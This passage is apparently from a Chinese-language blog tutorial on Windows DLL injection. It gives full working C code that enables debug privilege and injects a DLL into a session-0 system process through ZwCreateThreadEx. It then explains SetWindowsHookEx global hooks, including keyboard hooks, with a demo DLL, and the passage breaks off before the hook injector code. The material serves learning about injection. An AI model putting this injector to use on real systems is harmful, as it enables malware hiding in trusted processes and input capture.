<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs elm">#ifdef _WIN64<br>typedef <span class="hljs-type">DWORD</span>(<span class="hljs-type">WINAPI</span>* typedef_ZwCreateThreadEx)(<br><span class="hljs-type">PHANDLE</span> <span class="hljs-type">ThreadHandle</span>,<br><span class="hljs-type">ACCESS_MASK</span> <span class="hljs-type">DesiredAccess</span>,<br><span class="hljs-type">LPVOID</span> <span class="hljs-type">ObjectAttributes</span>,<br><span class="hljs-type">HANDLE</span> <span class="hljs-type">ProcessHandle</span>,<br><span class="hljs-type">LPTHREAD_START_ROUTINE</span> lpStartAddress,<br><span class="hljs-type">LPVOID</span> lpParameter,<br><span class="hljs-type">ULONG</span> <span class="hljs-type">CreateThreadFlags</span>,<br><span class="hljs-type">SIZE_T</span> <span class="hljs-type">ZeroBits</span>,<br><span class="hljs-type">SIZE_T</span> <span class="hljs-type">StackSize</span>,<br><span class="hljs-type">SIZE_T</span> <span class="hljs-type">MaximumStackSize</span>,<br><span class="hljs-type">LPVOID</span> pUnkown);<br><br><br><br>#<span class="hljs-keyword">else</span><br>typedef <span class="hljs-type">DWORD</span>(<span class="hljs-type">WINAPI</span>* typedef_ZwCreateThreadEx)(<br><span class="hljs-type">PHANDLE</span> <span class="hljs-type">ThreadHandle</span>,<br><span class="hljs-type">ACCESS_MASK</span> <span class="hljs-type">DesiredAccess</span>,<br><span class="hljs-type">LPVOID</span> <span class="hljs-type">ObjectAttributes</span>,<br><span class="hljs-type">HANDLE</span> <span class="hljs-type">ProcessHandle</span>,<br><span class="hljs-type">LPTHREAD_START_ROUTINE</span> lpStartAddress,<br><span class="hljs-type">LPVOID</span> lpParameter,<br><span class="hljs-type">BOOL</span> <span class="hljs-type">CreateSuspended</span>,<br><span class="hljs-type">DWORD</span> dwStackSize,<br><span class="hljs-type">DWORD</span> dw1,<br><span class="hljs-type">DWORD</span> dw2,<br><span class="hljs-type">LPVOID</span> pUnkown);<br></code></pre></td></tr></table></figure>

<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>整个流程还是这样</p>
<p>1.打开进程，获取句柄</p>
<p>2.申请内存</p>
<p>3.写入内存</p>
<p>4.获取loadliabary</p>
<p>5.创建线程执行</p>
<p>6.等待线程结束</p>
<p>7.关闭句柄</p>
<p>session0函数的重点必须拿到 SE_PRIVILEGE_ENABLED 权限，所以需要提权</p>
<p>SE_PRIVILEGE_ENABLED 就是调试权限，我们必须要有这个权限才能对线程进程这些进行操作，默认是不开启的。我们可以在cmd命令行中输入 whoami &#x2F;all 这个命令来看一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022243591.png" srcset="/img/loading.gif" lazyload alt="image-20251002224322517"></p>
<h3 id="完整的代码"><a href="#完整的代码" class="headerlink" title="完整的代码"></a>完整的代码</h3><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-keyword">typedef</span> DWORD(WINAPI* typedef_ZwCreateThreadEx)(<br>    PHANDLE ThreadHandle,<br>    ACCESS_MASK DesiredAccess,<br>    LPVOID ObjectAttributes,<br>    HANDLE ProcessHandle,<br>    LPTHREAD_START_ROUTINE lpStartAddress,<br>    LPVOID lpParameter,<br>    ULONG CreateThreadFlags,<br>    SIZE_T ZeroBits,<br>    SIZE_T StackSize,<br>    SIZE_T MaximumStackSize,<br>    LPVOID pUnkown);<br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">typedef</span> DWORD(WINAPI* typedef_ZwCreateThreadEx)(<br>    PHANDLE ThreadHandle,<br>    ACCESS_MASK DesiredAccess,<br>    LPVOID ObjectAttributes,<br>    HANDLE ProcessHandle,<br>    LPTHREAD_START_ROUTINE lpStartAddress,<br>    LPVOID lpParameter,<br>    <span class="hljs-type">BOOL</span> CreateSuspended,<br>    DWORD dwStackSize,<br>    DWORD dw1,<br>    DWORD dw2,<br>    LPVOID pUnkown);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><br><br>DWORD GetProcessPID(<span class="hljs-type">char</span>* lpProcessName) &#123;<br><br>    DWORD ret = <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的进程ID，初始为0（未找到）</span><br>    PROCESSENTRY32 P32;<span class="hljs-comment">// 结构体，用于存储进程快照信息</span><br><br>    <span class="hljs-comment">//获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br>    HANDLE IpSnashot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (IpSnashot == INVALID_HANDLE_VALUE) &#123;<br>        printf(<span class="hljs-string">&quot;获取进程快照失败，请检查原因。erro:%d&quot;</span>, GetLastError());<br>    &#125;<br>    P32.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);<br>    Process32First(IpSnashot, &amp;P32);<span class="hljs-comment">// 获取快照中第一个进程信息</span><br><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (!lstrcmp(P32.szExeFile, lpProcessName)) &#123;<span class="hljs-comment">// 比较进程名</span><br><br>            ret = P32.th32ProcessID;<span class="hljs-comment">// 匹配成功，记录PID</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (Process32Next(IpSnashot, &amp;P32)); <span class="hljs-comment">//检索有关系统快照中记录的下一个进程的信息。</span><br>    CloseHandle(IpSnashot);<span class="hljs-comment">//关闭句柄 </span><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><br><span class="hljs-comment">// 提权函数</span><br><span class="hljs-type">BOOL</span> EnableDebugPrivileg() &#123;<br>    HANDLE hToken; <span class="hljs-comment">//初始化句柄空间，等下放句柄</span><br>    <span class="hljs-type">BOOL</span> fok = <span class="hljs-literal">FALSE</span>; <span class="hljs-comment">//初始化状态，现在debug权限还未开启</span><br>    <span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123;<br><br>        TOKEN_PRIVILEGES tp;<br>        tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>        LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="hljs-number">0</span>].Luid);<br>        tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>        AdjustTokenPrivileges(hToken, <span class="hljs-literal">FALSE</span>, &amp;tp, <span class="hljs-keyword">sizeof</span>(tp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        fok = (GetLastError() == ERROR_SUCCESS);<br>        CloseHandle(hToken);<br><br><br><br>    &#125;<span class="hljs-comment">//打开当前进程的，获取令牌，并存入hToken中</span><br>    <span class="hljs-keyword">return</span> fok;<br><br><br><br>&#125;<br><span class="hljs-comment">//注入函数</span><br><span class="hljs-type">BOOL</span> zwCreatThreadExInject(<span class="hljs-type">int</span> PID, <span class="hljs-keyword">const</span> <span class="hljs-type">char</span>* pszDllFileName) &#123;<br>    EnableDebugPrivileg();<br>    HANDLE hRemoteThread;<br>    DWORD dwStatus = <span class="hljs-number">0</span>;<br><br>    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, PID);<br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>        printf(<span class="hljs-string">&quot;OpenProcess error : %d\n&quot;</span>, GetLastError());<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    SIZE_T dwSize = (strlen(pszDllFileName) + <span class="hljs-number">1</span>);<br>    LPVOID pDllAddr = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);<br>    <span class="hljs-keyword">if</span> (pDllAddr == <span class="hljs-literal">NULL</span>) &#123;<br>        printf(<span class="hljs-string">&quot;VirtualAllocEx error\n&quot;</span>);<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, <span class="hljs-literal">NULL</span>)) &#123;<br>        printf(<span class="hljs-string">&quot;WriteProcessMemory error\n&quot;</span>);<br>        VirtualFreeEx(hProcess, pDllAddr, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    HMODULE hNtdllDll = LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hNtdllDll) &#123;<br>        printf(<span class="hljs-string">&quot;Load ntdll.dll error\n&quot;</span>);<br>        VirtualFreeEx(hProcess, pDllAddr, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    FARPROC pFuncProcAddr = GetProcAddress(GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pFuncProcAddr) &#123;<br>        printf(<span class="hljs-string">&quot;Get LoadLibraryA error\n&quot;</span>);<br>        FreeLibrary(hNtdllDll);<br>        VirtualFreeEx(hProcess, pDllAddr, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdllDll, <span class="hljs-string">&quot;ZwCreateThreadEx&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == ZwCreateThreadEx) &#123;<br>        printf(<span class="hljs-string">&quot;GetProcAddress error\n&quot;</span>);<br>        FreeLibrary(hNtdllDll);<br>        VirtualFreeEx(hProcess, pDllAddr, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    dwStatus = ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="hljs-literal">NULL</span>, hProcess,<br>        (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (dwStatus != <span class="hljs-number">0</span>) &#123;<br>        printf(<span class="hljs-string">&quot;ZwCreateThreadEx error: %d\n&quot;</span>, dwStatus);<br>        FreeLibrary(hNtdllDll);<br>        VirtualFreeEx(hProcess, pDllAddr, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br><br>    CloseHandle(hProcess);<br>    FreeLibrary(hNtdllDll);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br><br><br><br><br><span class="hljs-type">int</span> main()<br>&#123;<br>    <span class="hljs-type">int</span> pid = GetProcessPID(<span class="hljs-string">&quot;unsecapp.exe&quot;</span>);<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;未找到进程\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-type">char</span>* dll_path = <span class="hljs-string">&quot;F:\\c\\yawatadll\\x64\\Release\\yawatadll.dll&quot;</span>;<br><br>    <span class="hljs-type">BOOL</span> bRet = zwCreatThreadExInject(pid, dll_path);<br>    <span class="hljs-keyword">if</span> (bRet==<span class="hljs-literal">FALSE</span>)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;Inject dll failed\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        printf(<span class="hljs-string">&quot;Inject dll successfully\n&quot;</span>);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022312910.png" srcset="/img/loading.gif" lazyload alt="image-20251002231206790"></p>
<h1 id="Hook注入"><a href="#Hook注入" class="headerlink" title="Hook注入"></a>Hook注入</h1><p>Hook注入利用的Windows操作系统的一个机制</p>
<h2 id="一、什么是-Hook？"><a href="#一、什么是-Hook？" class="headerlink" title="一、什么是 Hook？"></a><strong>一、什么是 Hook？</strong></h2><p>首先，我们从“Hook”这个词本身说起。在计算机领域，Hook 的字面意思就是“钩子”。你可以想象一下，在一个程序的执行流程中，就像有一条线在前进。而“钩子”的作用，就是在这条线的某个特定位置，挂上一个我们自己的函数（或者说一段代码）。</p>
<p>当程序执行到这个“挂钩”的位置时，它不会直接继续原来的流程，而是会先执行我们挂上去的函数。等我们的函数执行完毕后，它再决定是继续原来的流程，还是做一些其他的操作。</p>
<p><strong>核心思想：</strong> 在程序执行的某个关键点，插入自定义代码，从而改变或增强程序的行为。</p>
<h2 id="二、为什么需要-Hook？"><a href="#二、为什么需要-Hook？" class="headerlink" title="二、为什么需要 Hook？"></a><strong>二、为什么需要 Hook？</strong></h2><p>Hook 的出现，主要是为了解决以下几个问题：</p>
<ol>
<li><strong>扩展功能：</strong> 很多时候，我们希望在不修改原有程序源代码的情况下，为它增加新的功能。比如，一个现有的软件，我们想给它添加一个统计用户操作的功能，或者在某个事件发生时发送通知。</li>
<li><strong>调试和分析：</strong> 在程序运行过程中，我们可能想知道某个函数何时被调用、参数是什么、返回值是什么。Hook 可以在不修改程序的情况下，帮助我们监视这些信息。</li>
<li><strong>拦截和修改：</strong> 有些场景下，我们甚至希望拦截程序的某个操作，并对其进行修改。比如，拦截一个文件写入操作，然后修改写入的内容；或者拦截一个网络请求，修改请求的参数。</li>
<li><strong>兼容性：</strong> 有时，为了让新旧系统或不同模块之间更好地协同工作，Hook 也可以作为一种桥梁。</li>
</ol>
<h2 id="三-核心原理和异同"><a href="#三-核心原理和异同" class="headerlink" title="三.核心原理和异同"></a>三.核心原理和异同</h2><p>Hook注入是利用 Windows 提供的<strong>消息挂钩机制</strong>，开发者编写包含 <strong>HookProc</strong> 的 <strong>DLL（动态链接库）</strong>，调用 <strong>SetWindowsHookEx</strong>（例如 <strong>WH_GETMESSAGE</strong>、<strong>WH_KEYBOARD_LL</strong> 等钩子类型）后，系统会自动将该 DLL 注入到指定的<strong>线程 &#x2F; 进程</strong>中。</p>
<p>注入这个dll是Windows 自己自动加载到进程或线程里面的。根据这种机制我们也分为 全局注入(所有进程都插一遍)和消息注入（只插入指定的进程）</p>
<h2 id="需要使用的windows-api"><a href="#需要使用的windows-api" class="headerlink" title="需要使用的windows api"></a>需要使用的windows api</h2><p>1.设置钩子的API</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">HHOOK WINAPI SetWindowsHookEx（<br>  <span class="hljs-variable">_In_</span>  int    idHook，　　　　　　　　　　　　<span class="hljs-comment">//设置钩子的类型.意思就是我要设置的钩子是什么钩子. 可以是监视窗口过程.可以是监视消息队列.</span><br>  <span class="hljs-variable">_In_</span> HOOKPROC lpfn，　　　　　　　　　　　　 <span class="hljs-comment">//根据钩子类型.设置不同的回调函数.</span><br>  <span class="hljs-variable">_In_</span> HINSTANCE hMod，　　　　　　　　　　　　<span class="hljs-comment">//钩子设置的Dll实例句柄,就是DLL的句柄</span><br>  <span class="hljs-variable">_In_</span> DWORD dwThreadId　　　　　　　　　　   <span class="hljs-comment">//设置钩子的线程ID. 如果为0 则设置为全局钩子.</span><br>）;<br>　　　<br></code></pre></td></tr></table></figure>

<p>2.取消钩子的API</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">BOOL</span> WINAPI UnhookWindowsHookEx（<br>  _In_ HHOOK hhk                        <span class="hljs-comment">//参数一是 SetWindowHookEx的返回值.也就是钩子过程句柄. </span><br>）;                  <br></code></pre></td></tr></table></figure>

<p>3.钩子回调</p>
<p>钩子回调根据SetWindowsHookEx参数1来设定的。</p>
<p>idHook 要安装的钩子(HOOK)的类型，它决定了 HOOKPROC 被调用的时机，可选参数如下。</p>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>WH_MSGFILTER &#x3D; -1</td>
<td>线程级，截获用户与控件交互的消息</td>
</tr>
<tr>
<td>WH_JOURNALRECORD &#x3D; 0</td>
<td>系统级，记录所有消息队列送出的输入消息</td>
</tr>
<tr>
<td>WH_JOURNALPLAYBACK &#x3D; 1</td>
<td>系统级，回放由WH_JOURNALRECORD记录的消息</td>
</tr>
<tr>
<td>WH_KEYBOARD &#x3D; 2</td>
<td>系统级或线程级，截获键盘消息</td>
</tr>
<tr>
<td>WH_GETMESSAGE &#x3D; 3</td>
<td>系统级或线程级，截获从消息队列送出的消息</td>
</tr>
<tr>
<td>WH_CALLWNDPROC &#x3D; 4</td>
<td>系统级或线程级，截获发送到目标窗口的消息</td>
</tr>
<tr>
<td>WH_CBT &#x3D; 5</td>
<td>系统级或线程级，截获系统基本消息例如：窗口的创建，激活，关闭，最大&#x2F;最小化，移动等</td>
</tr>
<tr>
<td>WH_SYSMSGFILTER &#x3D; 6</td>
<td>系统级，截获系统范围内用户与控件交互的消息</td>
</tr>
<tr>
<td>WH_MOUSE &#x3D; 7</td>
<td>系统级或线程级，截获鼠标消息</td>
</tr>
<tr>
<td>WH_HARDWARE &#x3D; 8</td>
<td>系统级或线程级，截获非标准硬件(非鼠标，键盘)的消息</td>
</tr>
<tr>
<td>WH_DEBUG &#x3D; 9</td>
<td>系统级或线程级，在其它钩子调用前调用，用于调试钩子</td>
</tr>
<tr>
<td>WH_SHELL &#x3D; 10</td>
<td>系统级或线程级，截获发给外壳应用程序的消息</td>
</tr>
<tr>
<td>WH_FOREGROUNDIDLE &#x3D; 11</td>
<td>系统级或线程级，在程序前台线程空闲时调用</td>
</tr>
<tr>
<td>WH_CALLWNDPROCRET &#x3D; 12</td>
<td>系统级或线程级，截获目标窗口处理完的消息在SendMessage被调用后发生</td>
</tr>
<tr>
<td>WH_KEYBOARD_LL &#x3D; 13</td>
<td>系统级，截获全局键盘消息</td>
</tr>
<tr>
<td>WH_MOUSE_LL &#x3D; 14</td>
<td>系统级，截获全局鼠标消息</td>
</tr>
</tbody></table>
<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs hsp">LRESULT CALLBACK MyProc（         <span class="hljs-comment">//这个回调函数里面写我们的代码.</span><br>  _In_  <span class="hljs-keyword">int</span>     nCode，<br>  _In_ <span class="hljs-keyword">WPARAM</span> <span class="hljs-keyword">wParam</span>，<br>  _In_ <span class="hljs-keyword">LPARAM</span> <span class="hljs-keyword">lParam</span><br>）<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<h2 id="全局Hook注入"><a href="#全局Hook注入" class="headerlink" title="全局Hook注入"></a>全局Hook注入</h2><p>dll代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br>HHOOK hHook=<span class="hljs-literal">NULL</span>;<br>HINSTANCE hInst = <span class="hljs-literal">NULL</span>;<br><br><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">HookProc</span><span class="hljs-params">(<span class="hljs-type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span>&#123;<br><br> <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(hHook, nCode, wParam, lParam);<span class="hljs-comment">//给下一个钩子或者应用程序继续处理消息</span><br><br><br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Hookstart</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">//WH_GETMESSAGE钩住所有消息</span><br>    hHook = <span class="hljs-built_in">SetWindowsHookEx</span>(WH_GETMESSAGE, HookProc, hInst, <span class="hljs-number">0</span>);<br><br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Hookstop</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 卸载钩子</span><br>    <span class="hljs-keyword">if</span> (hHook) &#123;<br>        <span class="hljs-built_in">UnhookWindowsHookEx</span>(hHook);<br>    &#125;<br>    <br>&#125;<br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        hInst=hModule;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;yawataa&quot;</span>, <span class="hljs-string">&quot;yawataa&quot;</span>, MB_OK);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p>注入c 文件</p>
